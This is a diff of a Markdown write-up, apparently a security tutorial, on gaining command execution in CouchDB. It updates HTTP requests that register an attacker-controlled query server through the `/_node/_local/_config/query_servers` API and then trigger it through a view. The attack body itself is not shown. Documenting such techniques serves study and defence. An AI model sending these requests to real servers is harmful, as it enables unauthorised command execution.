@@ -59,11 +59,11 @@ Inside these functions the attacker controls arbitrary JavaScript, including `JS
 The higher-impact class targets the `_config` API, specifically the `query_servers` section, which maps a language name to the command line CouchDB executes to start that interpreter:
 
 ```http
-GET /_config/query_servers HTTP/1.1
+GET /_node/_local/_config/query_servers HTTP/1.1
 ```
 
 ```http
-PUT /_config/query_servers/cmd HTTP/1.1
+PUT /_node/_local/_config/query_servers/cmd HTTP/1.1
 Host: target:5984
 Content-Type: application/json
 
@@ -78,7 +78,7 @@ PUT /app/_design/run HTTP/1.1
 { "language": "cmd", "views": { "z": { "map": "..." } } }
 ```
 
-Querying `/app/_design/run/_view/z` drives CouchDB to invoke the attacker-supplied command line. The `_config` endpoints are node-local in clustered deployments, so the attacker targets a specific node's port or the `_node/<name>/_config` path.
+Querying `/app/_design/run/_view/z` drives CouchDB to invoke the attacker-supplied command line. CouchDB 2.x and later replaced the legacy top-level `/_config` with per-node `/_node/{name}/_config`; `_local` resolves to the node that handles the request, and a specific node name targets another node in a cluster.
 
 ## Finding the sink
 
